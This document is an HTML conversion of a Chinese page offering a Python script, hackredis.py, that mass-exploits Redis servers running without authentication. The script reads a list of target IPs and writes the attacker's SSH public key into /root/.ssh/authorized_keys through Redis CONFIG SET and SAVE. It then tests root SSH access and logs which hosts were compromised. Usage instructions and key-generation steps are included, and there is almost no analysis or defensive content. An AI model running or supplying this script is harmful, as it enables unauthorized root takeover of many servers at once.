<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>(python)redis未授权批量提权脚本</h1><h2>一、漏洞简介</h2><p>(python)redis未授权批量提权脚本</p><h2>二、影响范围</h2><h2>三、复现过程</h2><h4><em>安装依赖</em></h4><p>☁  ~ sudo easy_install redis</p><h4><em>使用</em></h4><p>☁  redis  python hackredis.py                                  <br />usage: hackredis.py [-h] [-l IPLIST] [-p PORT] [-r ID_RSAFILE] [-sp SSH_PORT]<br /><br />For Example:<br />-----------------------------------------------------------------------------<br />python hackredis.py  -l ip.txt -p 6379 -r foo.txt -sp 22<br /><br />optional arguments:<br />  -h, --help     show this help message and exit<br />  -l IPLIST      the hosts of target<br />  -p PORT        the redis default port<br />  -r ID_RSAFILE  the ssh id_rsa file you generate<br />  -sp SSH_PORT   the ssh port</p><p>首先需要ssh密钥:</p><p>☁  ~  ssh-keygen -t rsa<br />☁  ~  cp ~/.ssh/id_rsa.pub /tmp/foo.txt</p><p>之后将ip列表填入ip.txt，然后就可以跑了。 成功的将会输出到success.txt,执行成功但是ssh连接失败的会存储在unconnect.txt，操作失败的会存储在fail.txt。</p><p>#!/usr/bin/python<br />#coding:utf-8<br />#############################################################<br />## @file    hackredis.py                                   ##<br />## @date    2015-12-11                                     ##<br />## @author  evi1cg                                         ##<br />#############################################################<br />import redis<br />import argparse<br />import textwrap<br />import sys<br />import pexpect<br />def getargs():<br />  parser = argparse.ArgumentParser(prog='hackredis.py', formatter_class=argparse.RawTextHelpFormatter, description=textwrap.dedent('''\<br />  For Example:<br />  -----------------------------------------------------------------------------<br />  python hackredis.py  -l ip.txt -p 6379 -r foo.txt -sp 22'''))<br />  parser.add_argument('-l', dest='iplist', type=str, help='the hosts of target')<br />  parser.add_argument('-p', dest='port', default=6379, type=int, help='the redis default port')<br />  parser.add_argument('-r', dest='id_rsafile', type=str, help='the ssh id_rsa file you generate')<br />  parser.add_argument('-sp', dest='ssh_port', type=int,default=22, help='the ssh port')<br />  if(len(sys.argv[1:]) / 2 != 4):<br />    sys.argv.append('-h')<br />  return parser.parse_args()<br /><br />def hackredis(host,port):<br />  ck = 0<br />  try:<br />    print "[*] Attacking ip:%s"%host<br />    r =redis.StrictRedis(host=host,port=port,db=0,socket_timeout=2)<br />    r.flushall<br />    r.set('crackit',foo)<br />    r.config_set('dir','/root/.ssh/')<br />    r.config_set('dbfilename','authorized_keys')<br />    r.save()<br />    ck =1<br />  except:<br />    print "\033[1;31;40m[-]\033[0m Something wrong with %s"%host<br />    write(host,2)<br />    ck =0<br />  if ck == 1:<br />    check(host)<br />  else:<br />    pass<br /><br />def check(host):<br />  print '\033[1;33;40m[*]\033[0m Check connecting... '<br />  try:<br />    ssh = pexpect.spawn('ssh root@%s -p %d' %(host,ssh_port))<br />    i = ssh.expect('[#\$]',timeout=2)<br />    if i == 0:<br />      print "\033[1;34;40m[+]\033[0m Success !"<br />      write(host,1)<br />    else:<br />      pass<br />  except:<br />    print "\033[1;32;40m[-]\033[0m Failed to connect !"<br />    write(host,3)<br />def write(host,suc):<br />  if suc == 1:<br />    filesname = 'success.txt'<br />  elif suc ==2:<br />    filesname = 'fail.txt'<br />  elif suc ==3:<br />    filesname = 'unconnect.txt'<br />  else:<br />    pass<br />    file_object = open(filesname,'a')<br />    file_object.write(host+'<br />')<br />    file_object.close()<br /><br /><br />def main():<br />  global foo,ssh_port<br />  paramsargs = getargs()<br />  try:<br />    hosts = open(paramsargs.iplist,"r")<br />  except(IOError):<br />    print "Error: Check your hostfile path<br />"<br />    sys.exit(1) <br />  port = paramsargs.port<br />  ssh_port = paramsargs.ssh_port<br />  try:<br />    foo = '<br /><br /><br />'+open(paramsargs.id_rsafile,&quot;r&quot;).readline()+'<br /><br /><br />'<br />  except(IOError):<br />    print "Error: Check your wordlist path<br />"<br />    sys.exit(1)     <br />  ips = [p.replace('<br />','') for p in hosts]<br />  for ip in ips:<br />    hackredis(ip.strip(),port)<br /><br /><br />if __name__ == "__main__":<br />  main()</p></body></html>